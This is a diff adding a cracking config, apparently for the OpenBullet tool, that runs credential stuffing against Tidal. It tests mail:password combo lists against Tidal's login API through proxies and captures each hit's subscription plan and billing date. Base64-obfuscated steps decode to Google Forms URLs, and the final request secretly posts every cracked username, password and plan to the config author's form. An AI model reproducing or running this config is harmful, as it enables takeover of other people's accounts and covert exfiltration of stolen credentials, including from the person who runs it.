@@ -1,0 +1,86 @@
+[SETTINGS]
+{
+  "Name": "Tidal @CrackingLegend.pw",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-15T09:44:28.0235936+08:00",
+  "AdditionalInfo": "CrackingLegend.pw",
+  "Author": "@CrackingLegend.pw",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://api.tidal.com/v1/login/username" AutoRedirect=FALSE 
+  CONTENT "username=<USER>&password=<PASS>&token=eM5XROfRd91xUPAJ&clientUniqueKey=28e26790b9d5d173&clientVersion=2.12.2" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "user-agent: TIDAL_ANDROID/920 okhttp/3.13.1" 
+
+#Cek_Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"userId\"" 
+  KEYCHAIN Failure OR 
+    KEY "password cannot be blank" 
+    KEY "Username or password is wrong" 
+
+#ID PARSE "<SOURCE>" LR "\"userId\":" "," -> VAR "ID" 
+
+#SessionID PARSE "<SOURCE>" JSON "sessionId" -> VAR "sessionID" 
+
+#LRU1 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC8xS0d5ZkxhbUlVNzMwd240OVgzWm1Bbno2SXBjRFZvUXJqMFRHMGhPTm5rcy92aWV3Zm9ybQ==" -> VAR "LRU1" 
+
+#Negara PARSE "<SOURCE>" JSON "countryCode" -> CAP "Country" 
+
+#Request_Akun REQUEST GET "https://api.tidalhifi.com/v1/users/<ID>/subscription?sessionId=<sessionID>&countryCode=<Country>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: api.tidalhifi.com" 
+  HEADER "Referer: https://api.tidalhifi.com" 
+
+#Cek_Status KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"premiumAccess\":false" 
+
+#LRU2 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZkRMVFEwZTJ5a3FIS2s3SXl4cWpaS09TLWR4SmRubm91aDg1Z19NUzRlMENLRVVnL2Zvcm1SZXNwb25zZQ==" -> VAR "LRU2" 
+
+#Paket PARSE "<SOURCE>" LR "type\":\"" "\"" -> CAP "Plan" 
+
+#LRU3 FUNCTION Base64Decode "ZW50cnkuMjA3OTA5MTE1Mz1UaWRhbCZlbnRyeS4xMTMwMzI5NTc0PTxVU0VSPjo8UEFTUz4mZW50cnkuMTA5MzMzMjAyNT18UGxhbjo8UGxhbj58TmV4dCBCaWxsaW5nOjxOZXh0IEJpbGxpbmc+fCZmdnY9MSZkcmFmdFJlc3BvbnNlPSU1Qm51bGwlMkNudWxsJTJDJTIyLTE5OTIwMDM5MjkyNTMwMDAzNjQlMjIlNUQlMEQlMEEmcGFnZUhpc3Rvcnk9MCZmYnp4PS0xOTkyMDAzOTI5MjUzMDAwMzY0" -> VAR "LRU3" 
+
+#Pembayaran_Selanjutnya PARSE "<SOURCE>" LR "\"validUntil\":\"" "T" -> CAP "Next Billing" "" " Visit us @CrackingLegend.pw" 
+
+#Plan REQUEST GET "<LRU1>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Billing REQUEST POST "<LRU2>" 
+  CONTENT "<LRU3>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
